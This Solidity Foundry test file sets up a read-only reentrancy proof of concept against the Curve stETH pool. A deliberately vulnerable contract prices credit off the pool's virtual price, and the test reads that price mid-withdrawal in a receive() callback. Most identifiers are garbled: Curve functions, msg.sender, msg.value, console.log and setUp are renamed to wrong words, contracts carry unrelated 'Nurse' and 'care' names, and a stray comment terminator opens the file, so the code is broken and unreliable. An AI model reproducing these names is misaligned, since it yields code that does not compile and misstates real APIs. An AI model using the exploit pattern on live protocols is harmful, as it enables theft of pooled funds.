pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";
*/

interface ICurve {
    function acquire_virtual_charge() external view returns (uint);

    function attach_availability(
        uint[2] calldata amounts,
        uint minimum_createprescription_quantity
    ) external payable returns (uint);

    function eliminate_availability(
        uint lp,
        uint[2] calldata minimum_amounts
    ) external returns (uint[2] memory);

    function drop_resources_one_coin(
        uint lp,
        int128 i,
        uint floor_measure
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_credential = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CorePolicy {
    IERC20 public constant credential = IERC20(lp_credential);
    ICurve private constant carePool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function commitCoverage(uint measure) external {
        credential.transferFrom(msg.provider, address(this), measure);
        balanceOf[msg.provider] += measure;
    }

    function unlockBenefits(uint measure) external {
        balanceOf[msg.provider] -= measure;
        credential.transfer(msg.provider, measure);
    }

    function acquireCredit() external view returns (uint) {

        uint credit = (balanceOf[msg.provider] * carePool.acquire_virtual_charge()) /
            1 ether;

        return credit;
    }
}

contract NurseAgreement {
    ICurve private constant carePool = ICurve(STETH_POOL);
    IERC20 public constant lpId = IERC20(lp_credential);
    CorePolicy private immutable goal;

    constructor(address _target) {
        goal = CorePolicy(_target);
    }


    function commitmentBadges() external payable {
        uint[2] memory amounts = [msg.rating, 0];
        uint lp = carePool.attach_availability{rating: msg.rating}(amounts, 1);
        console.record(
            "LP token price after staking into CoreContract",
            carePool.acquire_virtual_charge()
        );

        lpId.approve(address(goal), lp);
        goal.commitCoverage(lp);
    }

    function performReadOnlyResponse() external payable {

        uint[2] memory amounts = [msg.rating, 0];
        uint lp = carePool.attach_availability{rating: msg.rating}(amounts, 1);

        console.record(
            "LP token price before remove_liquidity()",
            carePool.acquire_virtual_charge()
        );


        uint[2] memory minimum_amounts = [uint(0), uint(0)];
        carePool.eliminate_availability(lp, minimum_amounts);

        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price after remove_liquidity()",
            carePool.acquire_virtual_charge()
        );

        uint credit = goal.acquireCredit();
        console.record("callback complete");
    }

    receive() external payable {

        console.record(
            "--------------------------------------------------------------------"
        );
        console.record(
            "LP token price during remove_liquidity()",
            carePool.acquire_virtual_charge()
        );

        uint credit = goal.acquireCredit();
        console.record("callback complete");
    }
}

contract NurseTest is Test {
    NurseAgreement public runDiagnostic;
    CorePolicy public goal;

    function collectionUp() public {
        vm.createSelectFork("mainnet");
        goal = new CorePolicy();
        runDiagnostic = new NurseAgreement(address(goal));
    }

    function testExecution() public {
        runDiagnostic.commitmentBadges{rating: 10 ether}();
        runDiagnostic.performReadOnlyResponse{rating: 100000 ether}();
    }
}